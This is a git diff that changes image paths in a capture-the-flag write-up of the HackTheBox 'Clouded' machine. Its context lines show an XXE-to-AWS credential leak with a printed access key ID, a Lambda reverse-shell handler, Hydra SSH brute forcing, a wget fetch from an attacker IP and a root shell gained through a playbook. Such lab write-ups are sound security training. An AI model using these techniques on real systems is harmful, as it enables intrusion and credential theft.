@@ -27,7 +27,7 @@ Let’s check the web page!
 
 There isn’t much interesting information on this website except a page where we can upload a file to get a shareable link. The only allowed extensions are pdf,docx,png and svg. There is also another page “about” which gives us some lore and some information about how the platform works, the one line keeping my attention being “Files scanned for malicious content and rogue metadata” which suggest an injection attack could be exploited.
 
-![Website upload page](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/website_upload_page.png)
+![Website upload page](/HTB-UNIV/2024/clouded/images/website_upload_page.png)
 
 We can then download our file on a link like this one on local.clouded.htb:
 `http://local.clouded.htb/uploads/file_FRSAWhTLhm.pdf`
@@ -56,7 +56,7 @@ The exception being with .svg files. When we would upload an svg file without th
 
 We then tried to do some recon on our newly found domain local.clouded.htb and we found out it was an AWS bucket running behind which used a restAPI and an AWS lambda function.
 
-![AWS lambda](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/aws_lambda.png)
+![AWS lambda](/HTB-UNIV/2024/clouded/images/aws_lambda.png)
 
 ## XXE&AWS
 
@@ -126,7 +126,7 @@ AWS_REGION=us-east-1\
 AWS_ACCESS_KEY_ID=AKIA5M34BDN8GCJGRFFBSHLVL
 ```
 
-![AWS login](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/aws_login.png)
+![AWS login](/HTB-UNIV/2024/clouded/images/aws_login.png)
 
 We can see that there is a folder containing all of the file uploaded since the beginning called “uploads” and another one called “clouded-internal”, in the second folder we find a database called backup.db so we download it:
 `
@@ -135,7 +135,7 @@ We can see that there is a folder containing all of the file uploaded since the 
 
 We open the .db file using sqlitebrowser:
 
-![Database](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/database.png)
+![Database](/HTB-UNIV/2024/clouded/images/database.png)
 
 In the database there are 50 rows containing each a first and last name as well as an md5 password, all of them got cracked in a few seconds using john.
 
@@ -201,11 +201,11 @@ def handler(event, context):
   p = subprocess.call(["/bin/bash", "-i"])
 ```
 
-![handler function upload](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/handler_function.png)
+![handler function upload](/HTB-UNIV/2024/clouded/images/handler_function.png)
 
 We can see that we successfully uploaded our function and we have executed using `lambda invoke`
 
-![lambda revshell](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/lambda_revshell.png)
+![lambda revshell](/HTB-UNIV/2024/clouded/images/lambda_revshell.png)
 
 We got a reverse shell, but after attempting privilege escalation on the machine, we realized there was a problem: there were almost no binaries, and there were no interesting files. At that moment, we thought that maybe this was out of scope, and we were right!
 
@@ -255,11 +255,11 @@ FILE_USERS.close()
 ```
 We use hydra to bruteforce: `hydra -C creds.txt ssh://clouded.htb`
 
-![hydra](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/hydra.png)
+![hydra](/HTB-UNIV/2024/clouded/images/hydra.png)
 
 We can now ssh login onto the machine and find the first flag !
 
-![userflag](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/userflag.png)
+![userflag](/HTB-UNIV/2024/clouded/images/userflag.png)
 
 ## Root
 
@@ -273,7 +273,7 @@ wget 10.10.10.10:8000/pspy64 #Victim
 
 We don’t find anything very interesting in linpeas but in pspy we can see that there is a cronjob running:
 
-![playbook](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/playbook.png)
+![playbook](/HTB-UNIV/2024/clouded/images/playbook.png)
 
 We can add another .yml file in /opt/infra-setup to get get a reverse shell as the root user:
 
@@ -288,6 +288,6 @@ We can add another .yml file in /opt/infra-setup to get get a reverse shell as t
 
 And boom we get a root reverse shell and we have our root flag!:
 
-![rootflag](/HTB-UNIVERSITY-2024/HTB-UNIV/2024/clouded/images/rootflag.png)
+![rootflag](/HTB-UNIV/2024/clouded/images/rootflag.png)
 
 Overall this was supposed a pretty easy challenge but it was very guessy and we lost a lot of time on a rabbit hole.
